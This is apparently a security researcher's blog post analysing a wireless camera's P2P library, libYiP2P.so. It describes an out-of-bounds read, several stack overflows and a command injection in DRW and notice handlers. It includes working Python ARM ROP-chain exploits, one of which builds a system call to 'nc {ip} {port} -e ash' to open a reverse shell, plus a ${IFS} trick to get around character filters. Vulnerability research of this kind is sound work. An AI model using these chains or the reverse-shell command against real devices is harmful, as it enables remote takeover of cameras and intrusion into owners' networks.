# OOB Read in DRW Handler

Lets dive straight into the bugs with arguably the most useful bug I found (and my first bug that isn't an overflow, command injection, or null pointer deref). This bug basically lets us read out anything in the ***libYiP2P.so*** memory after the buffer our data gets placed into.

## Cause

The cause of this bug is an unchecked 'offset' value that is user-controlled. The offset value tells the message parser where to fetch the data from, but is missing a check that this offset doesn't go past the end of the buffer. The value is an unsigned short, so we can read up to *65535* bytes from the start of our message buffer, which is in the memory of ***libYiP2P.so***.

We can see the offset getting pulled from the input buffer here:

![offset.png](/assets/images/analysing_a_wireless_network_camera_part_4/offset.png)

## Useful?

This bug is very useful, as we can send a DRW message to cause values from ***libYiP2P.so*** memory to be written to global memory, which are then returned with another DRW message. For example, we can send in a *IOTYPE_USER_IPCAM_SET_WHITE_LED_TIME* message with a large offset:

![set_led_time.png](/assets/images/analysing_a_wireless_network_camera_part_4/set_led_time.png)

You can see here that the **memcpy** call takes data from the start of the packet data + the offset from the packet, and the obtained data is passed into the **yi_p2p_on_set_white_led_time** function. We can then retrieve this data with another message, *IOTYPE_USER_IPCAM_GET_WHITE_LED_TIME*, which fetches the value we set. 

This means we can remotely read ***libYiP2P.so*** memory, which turns out to be very useful as we can leak a bunch of very useful addresses, including the base of the ***libYiP2P.so*** memory we are reading. This is another method we can use to defeat the ASLR on these binaries.

# Stack Overflow 1

This bug is a string-based stack overflow in the *USER_IPCAM_SET_AP_MODE_REQ* DRW message handler.

## Cause

This bug is caused by usage of **strcpy** without a check on the input string. The handler parses three parameters, *ssid*, *pwd*, and *enable*.

![set_ap_mode.png](/assets/images/analysing_a_wireless_network_camera_part_4/set_ap_mode.png)

These extracted parameters are passed to the **yi_p2p_on_set_ap_conf** function:

![p2p_set_ap_conf.png](/assets/images/analysing_a_wireless_network_camera_part_4/p2p_set_ap_conf.png)

For some reason, they use a safe **strncpy** call when they copy to the *for_p2p_s* struct, but not the *sys_wifi_config* struct on the stack which looks like this:

![sys_wifi_config_struct.png](/assets/images/analysing_a_wireless_network_camera_part_4/sys_wifi_config_struct.png)

We can hit this overflow by sending in a large *pwd* value in the *IOTYPE_USER_IPCAM_SET_AP_MODE_REQ* packet.

## Useful?

This is quite a nice overflow, as we can hijack execution before the **ak_config_set_sys_wifi** call (which also has **strcpy** calls that take in the *pwd* value and copy this into a 50 byte stack buffer which we'd hit if we didn't hit the earlier **strcpy**, very secure), meaning none of the credentials we provide get saved and mess with other stuff.

However, as this is a string-based stack overflow, we can't send in null terminators, so we can only use gadgets within the shared libraries - meaning we'd need a leak. Luckily, the last bug we found gives us that!

## Exploit

I put together an exploit that uses the OOB-Read to leak a *libc* pointer (which we can use to get the base address), then uses a ROP-chain to call **system("nc 192.168.10.1 123 -e ash")** to get a reverse shell on *192.168.10.1*. Here is the ROP-chain in Python:

```
-python
def generate_stack_overflow_ROP_payload(pad_count, ip, port, libc_base):
	system_libc = libc_base + 0x4b4fc
	exit_libc = libc_base + 0x46c30

	# ROP Chain for reverse shell
	payload = b'a' * pad_count

	# Do the stack overflow and execute arbitrary command
	payload += (libc_base + 0x4a5e0).to_bytes(4, byteorder='little') # pc

	# | 0x4a5e0 | ldmia sp!,{r3,pc} |
	payload += (libc_base + 0x313f8).to_bytes(4, byteorder='little') # r3 - copy r2 into r0
	payload += (libc_base + 0x32c24).to_bytes(4, byteorder='little') # pc

	# | 0x32c24 | add r2,sp,#0x3c | blx r3 |

	# | 0x313f8 | cpy r0,r2 | ldmia sp!,{r4,pc} |
	payload += (0xdeadbeef).to_bytes(4, byteorder='little') # r4
	payload += (system_libc).to_bytes(4, byteorder='little') # pc
	payload += b"Aa0Aa1Aa" # padding
	payload += (libc_base + 0x184f4).to_bytes(4, byteorder='little') # pc

	# | 0x184f4 | mov r0,#0x1 | ldmia sp!,{r4,pc} |
	payload += (0xdeadbeef).to_bytes(4, byteorder='little') # r4
	payload += (exit_libc).to_bytes(4, byteorder='little') # pc
	payload += b"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab" # padding
	payload += f"nc {ip} {port} -e ash #".encode() # command to execute as system
	
	return payload
```

And here is the exploit in action:

![stack_overflow_1_exploit.png](/assets/images/analysing_a_wireless_network_camera_part_4/stack_overflow_1_exploit.png)

Note that I could have used the OOB-read to work out where the ***libYiP2P.so*** memory is and therefore where our packet will land, and execute from there (as the ***libYIP2P.so*** memory is executable) - but I fancied a challenge!

# Stack Overflow 2

This bug is a slightly less straightforward stack overflow in the *IOTYPE_USER_IPCAM_SET_WIFI_INFO* DRW message handler with some limitations.

## Cause

This bug is a result of bad length checks before a call to **sprintf** into a stack-based buffer. We start at the handler, where a string is extracted from the incoming packet, and a length check occurs, ensuring the length of this string is less than 171 bytes. If this passes, *ssid*, *pwd* and *bind_key* parameters are extracted from the packet using a call to **sscanf**.

![set_wifi_info.png](/assets/images/analysing_a_wireless_network_camera_part_4/set_wifi_info.png)

Looking at the function, it is clear that we can overflow the **ssid_t**, **pwd_k**, and **bind_key** buffers on the stack, however, due to the length check, we cannot reach the end of the stack frame, and we don't overflow anything interesting - so these issues aren't useful. However, the extracted data gets passed to the **yi_p2p_on_set_wifi_info** function. 

This function starts by killing the hotspot (killing our chances of using this for an easy reverse shell) before passing the *ssid* and *pwd* to **save_wifi_info2tmp**:

![save_wifi_info2tmp.png](/assets/images/analysing_a_wireless_network_camera_part_4/save_wifi_info2tmp.png)

We can now see the *pwd* parameter gets passed to an **sprintf** call into a 100 byte buffer near the end of the stack frame. As the earlier length check only checks that the incoming data has a length of less than 171, we can get this buffer to overflow the stack frame and gain execution.

## Useful?

This is less useful than the previous stack overflow as we have limited space after we overflow the return address, making exploitation with a ROP-chain a bit tricker. The hotspot also gets killed which is quite inconvenient as its basically a one-and-done exploit.

## Exploit

I decided to try and exploit this despite it not really being of any use at all, I wanted to see if it was possible to find a ROP-chain that could run **system** in the constrained space. 

Turns out is is possible, but it gets scarily close to the length check!

```
-python
def generate_smaller_size_stack_overflow_ROP_payload(pad_count, libc_base):
	system_libc = libc_base + 0x4b4fc
	exit_libc = libc_base + 0x46c30

	# ROP Chain
	payload = pad_count * b'e'
	
	# Do the stack overflow and execute arbitrary command
	payload += (libc_base + 0x46028).to_bytes(4, byteorder='little') # pc

	# | 0x46028 | cpy r0,r6 | ldmia sp!,{r4,r5,r6,pc}
	payload += (0xdeadbeef).to_bytes(4, byteorder='little') # r4
	payload += (0xdeadbeef).to_bytes(4, byteorder='little') # r5
	payload += (0xdeadbeef).to_bytes(4, byteorder='little') # r6
	payload += (libc_base + 0x291f4).to_bytes(4, byteorder='little') # pc

	# | 0x291f4 | add r0,r0,#0x1 | ldmia sp!,{r4,pc}
	payload += (0xdeadbeef).to_bytes(4, byteorder='little') # r4
	payload += (libc_base + 0x2f6bc).to_bytes(4, byteorder='little') # pc

	# | 0x2f6bc | str r3,[r0,#0x50] | ldmiane sp!,{r4,r5,r6,r7,pc}
	payload += (0xdeadbeef).to_bytes(4, byteorder='little') # r4
	payload += (0xdeadbeef).to_bytes(4, byteorder='little') # r5
	payload += (0xdeadbeef).to_bytes(4, byteorder='little') # r6
	payload += (0xdeadbeef).to_bytes(4, byteorder='little') # r7
	payload += (system_libc).to_bytes(4, byteorder='little') # pc

	return payload
```

And here is the exploit, this new method gives us a decent bit of space for our command as well:

![stack_overflow_2_exploit.png](/assets/images/analysing_a_wireless_network_camera_part_4/stack_overflow_2_exploit.png)

This causes the camera to perform a movement test, nothing too exciting! Note that there are character constraints on the command input (for reasons unknown), annoyingly, space is one of the bad characters. A workaround is using **${IFS}** instead of space so the command looks like this:

`/usr/bin/ak_adec_demo${IFS}48000${IFS}2${IFS}aac${IFS}/tmp/a`

At least it works!

# Global Overflow to Stack Overflow

More string-based bugs, all sense goes out of the window when strings are involved it seems! This is a global overflow in the *IOTYPE_USER_IPCAM_SET_DEVICE_PARAM_REQ* DRW message handler, which leads to a stack overflow in the DRW *IOTYPE_USER_IPCAM_GET_DEVICE_PARAM_REQ* message handler.

## Cause

Another case of being **strcpy**-happy without length checks.

Starting in the *IOTYPE_USER_IPCAM_SET_DEVICE_PARAM_REQ* handler, we can see the data from the received command buffer going into the **yi_p2p_on_set_device_param_conf** function.

![set_device_param_req.png](/assets/images/analysing_a_wireless_network_camera_part_4/set_device_param_req.png)

Looking at the function, we see a trivial overflow of the **g_hw_config** struct which has a size of 128 bytes (this might be useful by itself as the **ak_yi_av** global is reachable, but this needs more investigation, would likely be a struggle with the null-terminator limitation). 

![p2p_set_device_param_req.png](/assets/images/analysing_a_wireless_network_camera_part_4/p2p_set_device_param_req.png)

So now that we have an oversized string in **g_hw_config**, we can use the *IOTYPE_USER_IPCAM_GET_DEVICE_PARAM_REQ* message to fetch the string and send it back to us. 

![get_device_param_req.png](/assets/images/analysing_a_wireless_network_camera_part_4/get_device_param_req.png)

![p2p_get_device_param_req.png](/assets/images/analysing_a_wireless_network_camera_part_4/p2p_get_device_param_req.png)

We can see it calls **yi_p2p_reply_device_param_conf** with **g_hw_config** as the last parameter.

![p2p_device_param_reply.png](/assets/images/analysing_a_wireless_network_camera_part_4/p2p_device_param_reply.png)

And we are greeted with the familiar sight of a **strcpy** into a stack buffer.

## Useful?

This is quite a nice bug as we aren't clobbering anything important after **g_hw_config**, and we aren't at risk of messing with the state of the hotspot. However, I have seen the hardware config string being sent to the server in some of the captures I've taken, so it should definitely be set back to the default value after exploitation of the bug.

## Exploit

For the exploit of this bug, I did the exact same method as the *USER_IPCAM_SET_AP_MODE_REQ* exploit as we have plenty of space at the end of the buffer. For completeness, here is the exploit in action:

![global_to_stack_overflow_exploit.png](/assets/images/analysing_a_wireless_network_camera_part_4/global_to_stack_overflow_exploit.png)

# Command Injection

I was beginning to wonder when a command injection would show up! This command injection is present in the *MSG_NOTICE_TO_EX* message handler.

## Cause

Missing checks on user-controlled data before being passed to **system()**.

This bug isn't in a DRW handler, but it is in a handler a level up in the **PPPP_Thread_Recv_Proto_Device** handler (the same level that handles the *PunchPkt* and other types).

The function starts by checking the signature that was sent to it against a signature it generates itself with the *device_key* and contents of the message (the SHA1-HMAC we reversed in the last blog). If this passes, it ends up in **PPPP__NoticeToCallback** as we saw in the previous blog, and it is then passed to the handlers for the various types (listed in previous blog).

The bug is in the *UPDATE_HW* handler:

![update_hw.png](/assets/images/analysing_a_wireless_network_camera_part_4/update_hw.png)

It clearly takes the *hw* JSON value, puts it into a buffer, checks that it is large enough, then puts it into a command which gets passed to **system()**.

## Useful?

This bug is far less useful than the others as it requires knowledge of the *device_key* which never seems to leave the device (only in the form of signatures). Interestingly, the server likely has knowledge of the *device_key* as it verifies signatures that are sent using the *device_key* - so the server could trigger this bug pretty easily.

## Exploit

This one is a bit annoying to exploit as you need to know what time the device thinks it is, and you need to set the time in the packet to be 10000ish larger for it to work (there is an annoying time check in the earlier handler). Other than that, most of the difficulty comes from constructing the packet:

![update_hw_cmd_injection.png](/assets/images/analysing_a_wireless_network_camera_part_4/update_hw_cmd_injection.png)

# Summary

To summarise, we found and exploited a bunch of bugs in the 32100/32108 local hotspot functionality. We've pretty much doubled the list of methods we can use to get a reverse shell on this camera without taking it to pieces.

I hope you enjoyed finding these bugs with me!
